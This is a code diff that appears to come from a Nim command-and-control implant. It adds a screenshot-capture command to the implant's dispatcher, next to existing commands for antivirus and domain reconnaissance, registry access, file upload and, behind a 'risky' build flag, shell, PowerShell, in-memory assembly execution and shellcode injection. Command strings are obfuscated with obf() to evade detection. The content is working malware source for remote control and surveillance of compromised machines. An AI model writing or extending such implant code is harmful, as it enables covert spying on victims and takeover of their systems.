@@ -1,7 +1,7 @@
 import parsetoml, strutils, tables
 from crypto import xorStringToByteSeq, xorByteSeqToString
 
-include ../commands/[cat, cd, cp, curl, download, env, getAv, getDom, getLocalAdm, ls, mkdir, mv, ps, pwd, reg, rm, run, upload, wget, whoami]
+include ../commands/[cat, cd, cp, curl, download, env, getAv, getDom, getLocalAdm, ls, mkdir, mv, ps, pwd, reg, rm, run, screenshot, upload, wget, whoami]
 when defined risky:
     include ../commands/risky/[executeAssembly, inlineExecute, powershell, shell, shinject]
 
@@ -74,6 +74,8 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
             result = rm(args)
         elif cmd == obf("run"):
             result = run(args)
+        elif cmd == obf("screenshot"):
+            result = screenshot(args)
         elif cmd == obf("upload"):
             result = upload(li, cmdGuid, args)
         elif cmd == obf("wget"):
